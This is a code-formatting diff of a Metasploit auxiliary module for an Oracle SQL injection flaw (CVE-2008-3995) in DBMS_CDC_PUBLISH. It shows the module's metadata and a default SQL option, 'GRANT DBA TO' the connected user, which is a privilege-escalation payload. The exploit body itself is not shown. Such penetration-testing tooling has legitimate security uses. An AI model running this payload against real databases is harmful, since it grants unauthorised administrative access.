@@ -7,29 +7,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE',
-      'Description'    => %q{
-        The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE
-        procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
-        on the vulnerable package can exploit this vulnerability. By default, users granted
-        EXECUTE_CATALOG_ROLE have the required privilege.
-        Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1.
-        Fixed with October 2008 CPU.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE',
+        'Description' => %q{
+          The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE
+          procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
+          on the vulnerable package can exploit this vulnerability. By default, users granted
+          EXECUTE_CATALOG_ROLE have the required privilege.
+          Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1.
+          Fixed with October 2008 CPU.
+        },
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2008-3995' ],
           [ 'OSVDB', '49320']
         ],
-      'DisclosureDate' => '2008-10-22'))
+        'DisclosureDate' => '2008-10-22'
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
-        ])
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
+      ]
+    )
   end
 
   def run
